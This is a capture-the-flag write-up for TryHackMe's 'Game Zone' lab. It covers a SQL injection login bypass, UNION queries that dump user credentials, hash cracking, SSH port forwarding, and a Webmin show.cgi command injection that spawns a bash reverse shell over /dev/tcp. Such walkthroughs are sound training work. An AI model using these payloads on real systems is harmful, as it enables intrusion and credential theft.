---
layout: solution
category: TryHackMe
contest_code: Basic_Exploitation
contest_name: Basic Exploitation
problem_code: GAME_ZONE
problem_name: Game Zone
comments: false
tags: SQLi RCE
date: 2022-01-30
---

### A rust scan was use to conduct a speed scan on the IP and pipe the open ports to conduct a nmap scan. From what it shows, ports 22 and 80 are open

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/rustscan1.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/rustscan2.png)

‎


### Upon visiting the site, it shows me a game zone web page which is also a login page

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/web1.png)

‎


### After attempting a basic SQL Injection, it logged me in

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/login1.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/portal.png)

‎


### Knowing this site is vulnerable to SQLi, we are able to extract all the reviews. However these are not useful, so next we can attempt to extract something interesting in the database
### We can either do it manually or use SQLMAP

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/sqli1.png)

‎


<h3 style="color:aqua;">‎[Method 1]: From what it looks like, there are 3 columns --> ID (Hidden), Title & Review. Thus we can craft the following syntax to list all table names from information_schema.tables </h3>

```
' AND FALSE UNION SELECT null, table_name, null FROM information_schema.tables;#
```

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/sqli2.png)

<p style="color:orange;">We see an interesting table called users</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/sqli3.png)

‎


<h3 style="color:aqua;">‎[Method 1]: The next query is crafted to retrieve column names from the table "users".  From the result we can see that the credentials of users are stored </h3>

```
' AND FALSE UNION SELECT null, column_name, null FROM information_schema.columns WHERE table_name = 'users';#
```

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/sqli4.png)

‎


<h3 style="color:aqua;">‎[Method 1]: To list the creds, we can craft this simple SQL query and finally we got credentials of the user agent47 </h3>

```
' AND FALSE UNION SELECT null, username, pwd FROM users;#
```

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/sqli5.png)

‎


<h3 style="color:darkorchid;">‎[Method 2]: In order to use SQLMAP to obtain credentials, we first need to intercept the request using Burp Suite and save it into a file for it to be used by SQLMAP for authentication </h3>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/burpsuite.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/save.png)

‎


<h3 style="color:darkorchid;">‎[Method 2]: Next when we ran SQLMAP, we got credentials of the user agent47 </h3>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/sqlmap.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/sqlmap_crack.png)

‎


### We can determine this hash type by doing a lookup at online tools. It shows that this is a sha256 

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/hash.png)

‎


### After saving the hash in a file, I used hashcat to crack the credential of user47

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/hashcat.png)

‎


### Using the cracked credentials, we are able to authenticate as user47 from SSH

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/ssh.png)

‎


### When list all listening connections, we see that port 10000 is open

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/netstat.png)

<p style="color:orange;">When attempting to connect to it, we are getting connection refused. This could probably mean there is a firewall blocking our access to that port</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/ncat1.png)

‎


### We would be able to bypass the firewall by using SSH Port Forward

<p style="color:orange;">Since we can have SSH access to the vulnerable server, we could use the following command to create a link to the server on by accessing 127.0.0.1:9000 on our side from serverIP:10000</p>

```
ssh -L 9000:127.0.0.1:10000 agent47@$IP -fN
```

<p style="color:orange;">By doing so, we now can access the service on port 9000 locally</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/ncat2.png)

<p style="color:orange;">From a Nmap scan, it tells us it’s a web service - webmin</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/nmap.png)

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/login2.png)

‎


### By using agent47 credentials, we are able to login to webmin

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/webmin.png)

‎


### Running a Searchsploit for this version shows us that it is vulnerable to RCE by running /file/show.cgi

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/searchsploit.png)

‎


### Even though we can use Metasploit to get a shell, I'll try and refrain from suing Metasploit because it will be better if we understand how the exploit works

<p style="color:orange;">After understanding how the exploit works,  we can use the following query</p> 

```/file/show.cgi/bin/<5 or more - random chars of alphabetical & numerical>|<command>|```

<p style="color:orange;">If I am not wrong, the random characters is used to make a unique file thus below will be my final URL syntax to get a reverse shell</p>
```
/file/show.cgi/bin/g6s7t|bash -c 'exec bash -i &>/dev/tcp/10.11.21.149/9999 <&1'|
```

<p style="color:orange;">Before running that I'll have to open a Ncat listener and only after executing the URL syntax, got me a shell</p>

![Image](https://raw.githubusercontent.com/DJShankyShoe/Website/master/assets/Platforms/TryHackMe/Game%20Zone/exploit.png)
